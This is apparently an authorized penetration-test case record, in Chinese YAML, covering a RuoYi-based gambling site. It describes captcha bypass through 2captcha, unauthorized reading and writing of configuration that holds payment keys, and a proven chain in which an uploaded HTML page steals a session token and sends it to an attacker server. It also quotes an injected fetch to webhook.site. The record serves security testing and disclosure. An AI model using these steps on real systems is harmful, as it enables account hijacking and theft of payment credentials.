@@ -1,0 +1,121 @@
+# 案例：RuoYi 博彩站管理接口越权读写 + 支付密钥泄露（脱敏）
+
+target:
+  url: "TARGET_HOST"
+  type: "authorized"
+  name: "某六合彩站群（Telegram Mini App）"
+  tech_stack:
+    - "RuoYi 系 (Spring Boot) + Vue2 uni-app"
+    - "nginx + HTTP/2/3, 多域名 vhost 指向不同 upstream"
+    - "Redis (改端口 4379) + MySQL 8.0 (改端口 13306)"
+    - "宝塔面板 (bt-panel, 36793 自签证书)"
+    - "2captcha 可破解 RuoYi math 验证码"
+  ports: [22, 80, 443, 27700]
+  fingerprint:
+    framework: "RuoYi 定制版"
+    api_prefix: "/prod-api"
+    auth_type: "JWT HS512 + Redis session (login_user_key)"
+    captcha_type: "RuoYi 数学算式 (7*4=?)"
+    biz_module_prefix: "/bet"
+
+attack_surface:
+  - "管理配置接口 /bet/system/setting/*（越权）"
+  - "支付回调 /api/okpay/callback, /api/bobi/pay/callback, /api/bobi/cash/callback"
+  - "文件上传 /common/upload（html 白名单放行，/profile/ 被 SPA fallback 吞）"
+  - "多入口域名族（vhost 反代配置不一致）"
+
+techniques_tried:
+  - technique: "前端 JS 提取 API 端点"
+    result: "partial"
+    detail: "只拿到用户端接口（appLogin/sysUserAccount 等），管理接口不在用户端 JS 中"
+
+  - technique: "手工猜测业务接口路径 (/bet/user/list, /bet/gameRecord/list ...)"
+    result: "failed"
+    detail: "全部 404，方向错误；管理接口实际在 /bet/system/setting 前缀下"
+
+  - technique: "swagger / actuator / druid 未授权探测"
+    result: "failed"
+    detail: "swagger/druid 404；actuator 仅 health 开放（需认证）"
+
+  - technique: "IDOR (getUserAccount?userId=遍历)"
+    result: "failed"
+    detail: "接口忽略 userId 参数，始终返回当前用户"
+
+  - technique: "TG 登录伪造 (appTgLogin)"
+    result: "failed"
+    detail: "有 hash 校验，伪造 initData 返回『Telegram 登录校验失败』"
+
+  - technique: "支付回调伪造"
+    result: "partial"
+    detail: "回调接口存在且有验签（返回 fail / callback rejected）；密钥泄露后签名可构造（未实弹）"
+
+success_path:
+  - step: 1
+    action: "FOFA 反查 (title=<品牌已打码> / cert=域名) 发现全站群域名与服务器，含支付回调专用子域"
+    finding: "域名族 10+ 个、双服务器、内网 IP 泄露（宝塔自签证书 SAN）"
+
+  - step: 2
+    action: "入口轮换：meridian.example.com 的 vhost 反代损坏(502)，aurora.example.com/zenith.example.com/horizon.example.com/comet.example.com/randomsub.comet.example.com 指向活后端"
+    finding: "同 IP 不同 vhost 反代配置不一致，必须逐个测试，不能因一个 502 判定后端全挂"
+
+  - step: 3
+    action: "登录：captchaImage -> 2captcha(ImageToTextTask) -> 识别数学算式并计算答案 -> appLogin"
+    payload: "code = eval('7*4=?' 提取算式)；Authorization: Bearer <JWT>"
+    finding: "RuoYi math 验证码可全自动破解；token 头为 Bearer 而非前端自定义键"
+
+  - step: 4
+    action: "GET /bet/system/setting/getSysBasicInfo（user 角色 token）"
+    finding: "越权读取 90 字段系统配置：支付密钥全套（USDT/OKPay/Bobi）、内部接口 key/aes、汇率、提现费、开奖平台 URL、TG 群"
+
+  - step: 5
+    action: "PUT /bet/system/setting/updateSysBasicInfo 原值回写验证写权限；空值探测确认全量覆盖语义"
+    finding: "user 角色可写系统配置（实测清空 usdtApiKey 成功，已用备份原值恢复）；响应回显全部配置含密钥"
+
+  - step: 6
+    action: "检查配置字段注入痕迹"
+    finding: "officialChannel 字段存在他人注入的 <script>fetch(webhook.site)</script>；alipayFinanceContent 为 localStorage 窃取 payload —— 存储型 XSS 可利用面"
+
+techniques_learned:
+  - "RuoYi 定制站管理接口路径模式：/业务模块/system/资源（如 /bet/system/setting/getSysBasicInfo），用户端 JS 不含管理接口，必须用路径字典爆破或从管理端前端/文档获取"
+  - "同 IP 多 vhost 必须逐个测后端连通性（vhost 反代配置可能损坏/不一致），FOFA 发现的每个域名/子域（含随机子域）都要做入口测试"
+  - "配置类接口 GET/PUT 成对出现：找到 updateXxx 就能推断 getXxx；PUT 响应常回显全部配置（含密钥），是密钥泄露高发点"
+  - "PUT 全量覆盖语义：空值也会写入，探测前必须备份原始配置用于恢复（渗透伦理：破坏后必须恢复）"
+  - "间歇性后端（多实例部分故障/定时重启）：在线窗口短，需后台轮询脚本 + 窗口内按价值排序批量测试"
+  - "支付回调接口存在性可通过错误响应判断：JSON 不支持报 415、验签失败返回 fail/callback rejected"
+  - "RuoYi 数学验证码：2captcha ImageToTextTask 返回算式文本（如 '7*4=?'），需本地计算答案后提交；minLength/maxLength 参数对算式无效"
+
+fingerprint_triggers:
+  - "RuoYi 系 /prod-api 前缀 + captchaImage math 模式 → 自动打码登录 + /模块/system/ 路径字典爆破管理接口"
+  - "多域名同 IP + 部分 vhost 502 → 逐个 vhost 测试，勿因单个 502 放弃"
+  - "支付回调 URL 出现在配置接口 → 回调验签测试 + 密钥泄露后签名构造评估"
+  - "配置接口 PUT 响应回显密钥 → 优先 GET 对应配置接口（updateXxx → getXxx）"
+
+sources:
+  - agent: "骡子"
+    date: "2026-08-03"
+
+retest:
+  date: "2026-08-06"
+  summary: "首轮核心越权漏洞已修复（管理接口全部加权限），但发现 2 个新问题"
+  fixed:
+    - "GET/PUT /bet/system/setting/* 越权读写 → 返回『无权操作』（6 入口一致）"
+    - "管理接口 /system/user/list 等 → 403；RESTful IDOR /system/sysUserAccount/{userId} → 403"
+    - "meridian.example.com vhost 反代已修复（502 → 200）"
+  new_findings:
+    - technique: "getInfo 密码哈希泄露"
+      detail: "GET /prod-api/getInfo 响应 user 对象含 password 字段（bcrypt hash），框架标准实现不返回该字段；弱口令可离线爆破/撞库"
+    - technique: "上传任意 HTML 同源托管"
+      detail: "/common/upload 白名单含 html → /prod-api/profile/upload/xxx.html 全入口可访问（同源）；前端 token 存 localStorage['App-Token'] → 同源 HTML 可窃取；avatar 上传仅后缀过滤（GIF polyglot 可过）"
+  notes:
+    - "权限修复全面：getUserAccount 忽略 userId 参数、updatePwd 校验旧密码、submitFinanceInfo 有状态校验"
+    - "复测新检查点：getInfo 字段脱敏、上传目录 Content-Disposition、avatar 魔数校验"
+
+exploit_proven:
+  - chain: "上传HTML同源托管 -> 会话劫持"
+    date: "2026-08-06"
+    detail: "全链实证：上传窃取页 -> 真实浏览器访问 -> JS读取localStorage[App-Token] -> HTTPS外传攻击者服务器(收信日志 STEAL token len=210) -> 被窃token调getUserAccount返回200+用户数据。会话劫持成立"
+    evidence: "poc_full.js + steal_log.txt（本地证据）"
+  - chain: "getInfo哈希泄露 -> 离线破解"
+    date: "2026-08-06"
+    detail: "bcrypt.checkpw秒级命中弱口令（已打码）；撞库admin未中(密码不复用)。
+    rating_note: "低危设计缺陷——getInfo仅返回自己账号哈希，独立利用价值≈0；高危版本(管理接口批量拉哈希/IDOR)均已修复。仅作链A下游辅助(窃取token后破解明文撞库)"
